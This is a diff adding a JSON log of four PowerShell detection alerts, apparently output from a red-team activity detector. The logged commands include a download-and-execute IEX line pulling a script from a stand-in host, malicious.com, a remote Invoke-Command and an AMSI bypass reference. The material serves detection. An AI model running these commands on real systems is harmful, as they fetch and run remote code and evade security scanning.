@@ -1,0 +1,34 @@
+{
+    "date": "2025-04-07 18:41:13",
+    "total_alerts": 4,
+    "alerts": [
+        {
+            "timestamp": "2025-04-07",
+            "command": "08:00:00 powershell -enc QW5vbWFseQ==",
+            "pattern": "EncodedCommand",
+            "severity": "High",
+            "message": "Detected potential red team activity: EncodedCommand"
+        },
+        {
+            "timestamp": "2025-04-07",
+            "command": "08:01:00 IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')",
+            "pattern": "DownloadString",
+            "severity": "High",
+            "message": "Detected potential red team activity: DownloadString"
+        },
+        {
+            "timestamp": "2025-04-07",
+            "command": "08:03:00 Invoke-Command -ComputerName TARGET -ScriptBlock { dir }",
+            "pattern": "InvokeCommand",
+            "severity": "High",
+            "message": "Detected potential red team activity: InvokeCommand"
+        },
+        {
+            "timestamp": "2025-04-07",
+            "command": "08:05:00 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
+            "pattern": "AMSI_Bypass",
+            "severity": "High",
+            "message": "Detected potential red team activity: AMSI_Bypass"
+        }
+    ]
+}
